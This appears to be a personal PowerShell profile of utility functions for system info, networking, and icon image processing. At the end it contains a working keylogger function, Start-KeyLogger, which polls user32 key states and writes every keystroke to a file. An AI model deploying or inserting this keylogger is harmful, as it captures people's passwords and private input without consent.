
function Get-Event-Log {
	Get-EventLog -List | Select-Object -ExpandProperty Entries -ErrorAction SilentlyContinue | Where-Object { $_.EntryType -eq 'Error' }
}

function Show-WebPage {
	param
	(
		[Parameter(Mandatory = $true, HelpMessage = 'URL to open')]
		$URL
	)

	Start-Process -FilePath iexplore.exe -ArgumentList $URL
}
function Get-System-Info {
	Get-WmiObject -Class Win32_Processor | Select-Object -Property Name, Number*
}

function Get-LoggedOnUserSession {
	param ($ComputerName, $Credential)
	Get-WmiObject -Class Win32_LogonSession @PSBoundParameters |
	ForEach-Object {
		$_.GetRelated('Win32_UserAccount') |
		Select-Object -ExpandProperty Caption
	 } | Sort-Object -Unique
}
function Get-LoggedOnUser {
	param ($ComputerName, $Credential)
	Get-WmiObject -Class Win32_ComputerSystem @PSBoundParameters |
	Select-Object -ExpandProperty UserName
}
function Get-IP {
	$ComputerName = ''
	[System.Net.Dns]::GetHostAddresses($ComputerName).IPAddressToString
}
function Get-IPv4 {
	$ComputerName = ''
	[System.Net.Dns]::GetHostAddresses($ComputerName) |
	Where-Object {
		$_.AddressFamily -eq 'InterNetwork'
	} | Select-Object -ExpandProperty IPAddressToString
}
function Get-IPv6 {
	$ComputerName = ''
	[System.Net.Dns]::GetHostAddresses($ComputerName) |
	Where-Object {
		$_.AddressFamily -eq 'InterNetworkV6'
	} | Select-Object -ExpandProperty IPAddressToString
}


function Get-Links {
	param([string] $url='')
	$page = Invoke-WebRequest -Uri $url
	$page.Links
}

function Get-Raw {
	param([string] $url='')
	$page = Invoke-WebRequest -Uri $url
	$page.RawContent
}
function Get-FileMetaData {
	param([string[]]$folder)
	foreach($sFolder in $folder) {
		$a = 0
		$objShell = New-Object -ComObject Shell.Application
		$objFolder = $objShell.namespace($sFolder)

		foreach ($File in $objFolder.items()) {
			$FileMetaData = New-Object PSOBJECT
			for ($a; $a -le 266; $a++) {
				if($objFolder.getDetailsOf($File, $a)) {
					$hash += @{$($objFolder.getDetailsOf($objFolder.items, $a))	= $($objFolder.getDetailsOf($File, $a))}
					$FileMetaData | Add-Member $hash
					$hash.clear()
				}
			}
			$a = 0
			$FileMetaData
		}
	}
}


function Split-Vectors {
	param([Parameter(ValueFromPipeline = $true)]$path)
	process {
		if(!($path)){
			$path=$pwd
		}
		php ${HOME}/desktop/htdocs/php/split.php $path
	}
}


function Process-Icons {
	param([Parameter(ValueFromPipeline = $true)]$path)
	process {
		if(!($path)){
			$path=$pwd
		}
		php ${HOME}/desktop/htdocs/php/icon.php $path
	}
}
function Rename-Vectorized-Icons {
	param([Parameter(ValueFromPipeline = $true)]$path)
	process {
		if(!($path)){
			$path=$pwd
		}
		php ${HOME}/desktop/htdocs/php/rename.php $path
	}
}

function Resize-Icons {
	param([Parameter(ValueFromPipeline = $true)]$size)
	process {
		if(!($size)){
			$size=256
		}
		$dimensions = "{0}x{0}" -f $size
		mogrify -resize $dimensions -identify $path/*.png
	}
}

function Fix-Icons {
	param([Parameter(ValueFromPipeline = $true)]$path)
	begin{
		[System.Reflection.Assembly]::LoadWithPartialName("System.Drawing") |Out-Null
	}
	process {
		if(!($path)){
			$path=$pwd
		}
		$i = 0
		$files = Get-ChildItem $path -Filter *.png | % {
			$image = [System.Drawing.Image]::FromFile($_.FullName)
			New-Object PSObject -Property @{
				Index = $i
				Name = $_.Name
				BaseName = $_.BaseName
				Length = $_.Length
				Directory = $_.Directory
				Exists = $_.Exists
				FullName = $_.FullName
				Extension = $_.Extension
				Width  = $image.Width
				Height = $image.Height
			}
			$i++
			$image.Dispose()
		}

		$count = $files.Count
		$index = $count - 1
		while ($index -gt -1) {
			$image = $files[$index]
			$w1 = $image.Width
			$h1 = $image.Height
			$outfile = $image.FullName

			magick convert $outfile -trim $outfile
			magick convert $outfile -set option:size '%[fx:max(w,h)]x%[fx:max(w,h)]' xc:none +swap -gravity center -background none -composite $outfile

			$image = [System.Drawing.Image]::FromFile($outfile)
			$w2 = $image.Width
			$h2 = $image.Height
			$image.Dispose()

			if ($w1 -ne $w2 -or $h1 -ne $h2) {
				Write-Output "$outfile $w1,$h1 $w2,$h2"
			}
			$index--
		}
	}
}


function Fix-Icon-Dimensions {
	param([Parameter(ValueFromPipeline = $true)]$path)
	process {
		if(!($path)){
			$path=$pwd
		}
		$files = Get-ChildItem $path -Filter *.png	| select FullName # -Recurse
		$count = $files.Count
		$i = $count - 1
		$outfile = ""
		while ($i -gt 0) {
			$outfile = $files[$i].FullName
			# magick convert $outfile -set option:size '%[fx:max(w,h)]x%[fx:max(w,h)]' xc:none +swap -gravity center -composite $outfile
			# magick convert $outfile -set option:size '%[fx:max(w,h)]x%[fx:max(w,h)]' xc:none +swap -gravity center -extent 512x512 -background none -composite $outfile
			magick convert $outfile -set option:size '%[fx:max(w,h)]x%[fx:max(w,h)]' xc:none +swap -gravity center -background none -composite $outfile
			if ($i % 10 -eq 0) {
				Write-Output "$i $outfile"
			}
			$i--
		}
	}
}

function sublime {
	param([Parameter(ValueFromPipeline = $true)]$path)
	process {
		if(!($path)){
			$path=$pwd
		}
		echo $path
		subl $path
	}
}

function RemoveEmptyDirectories {
	param([Parameter(ValueFromPipeline = $true)]$path)
	process {
		if(!($path)){
			$path = $pwd
		}
		do {
			$dirs = gci $path -directory -recurse | Where { (gci $_.fullName).count -eq 0 } | select -expandproperty FullName
			$dirs | Foreach-Object { Remove-Item $_ }
		} while ($dirs.count -gt 0)
	}
}





function PortView {
	$proc = @{};
	Get-Process | ForEach-Object { $proc.Add($_.Id, $_) };
	netstat -aon | Select-String "\s*([^\s]+)\s+([^\s]+):([^\s]+)\s+([^\s]+):([^\s]+)\s+([^\s]+)?\s+([^\s]+)" | ForEach-Object {
		$g = $_.Matches[0].Groups;
		New-Object PSObject |
			Add-Member @{ Protocol =				$g[1].Value	} -PassThru |
			Add-Member @{ LocalAddress =			$g[2].Value	} -PassThru |
			Add-Member @{ LocalPort =				[int]$g[3].Value	} -PassThru |
			Add-Member @{ RemoteAddress =			$g[4].Value	} -PassThru |
			Add-Member @{ RemotePort =				$g[5].Value	} -PassThru |
			Add-Member @{ State =					$g[6].Value	} -PassThru |
			Add-Member @{ PID =					[int]$g[7].Value	} -PassThru |
			Add-Member @{ Process =	$proc[[int]$g[7].Value] } -PassThru ;
	#
	} | Format-Table Protocol,LocalAddress,LocalPort,RemoteAddress,RemotePort,State -GroupBy @{Name='Process';Expression={$p=$_.Process;@{$True=$p.ProcessName; $False=$p.MainModule.FileName}[$p.MainModule -eq $Null] + ' PID: ' + $p.Id}} -AutoSize
}

function Encrypt {
	param([Parameter(ValueFromPipeline = $true)]$Text)
	process {
		$Text |
		ConvertTo-SecureString -AsPlainText -Force |
		ConvertFrom-SecureString
	}
}
function Decrypt {
	param([Parameter(ValueFromPipeline = $true)]$Text)
	process {
		$SecureString = $Text |
		ConvertTo-SecureString
		$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecureString)
		[System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
	}
}

# function Start-KeyLogger($Path="C:\\Users\\Matthew\\Downloads\\keylogger.txt")
function Start-KeyLogger($Path="../log.txt") {
	# Signatures for API Calls
	$signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

	# load signatures and make members available
	$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru

	# create output file
	$null = New-Item -Path $Path -ItemType File -Force

	try
	{
		# Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red

		# create endless loop. When user presses CTRL+C, finally-block
		# executes and shows the collected key presses
		while ($true) {
			Start-Sleep -Milliseconds 40

			# scan all ASCII codes above 8
			for ($ascii = 9; $ascii -le 254; $ascii++) {
				# get current key state
				$state = $API::GetAsyncKeyState($ascii)

				# is key pressed?
				if ($state -eq -32767) {
					$null = [console]::CapsLock

					# translate scan code to real code
					$virtualKey = $API::MapVirtualKey($ascii, 3)

					# get keyboard state for virtual keys
					$kbstate = New-Object Byte[] 256
					$checkkbstate = $API::GetKeyboardState($kbstate)

					# prepare a StringBuilder to receive input key
					$mychar = New-Object -TypeName System.Text.StringBuilder

					# translate virtual key
					$success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

					if ($success)
					{
						# add key to logger file
						[System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
					 }
				 }
			 }
		 }
	 }
	finally
	{
		# open logger file in Notepad
		notepad $Path
	 }
}

# records all key presses until script is aborted by pressing CTRL+C
# will then open the file with collected key codes
# Start-KeyLogger

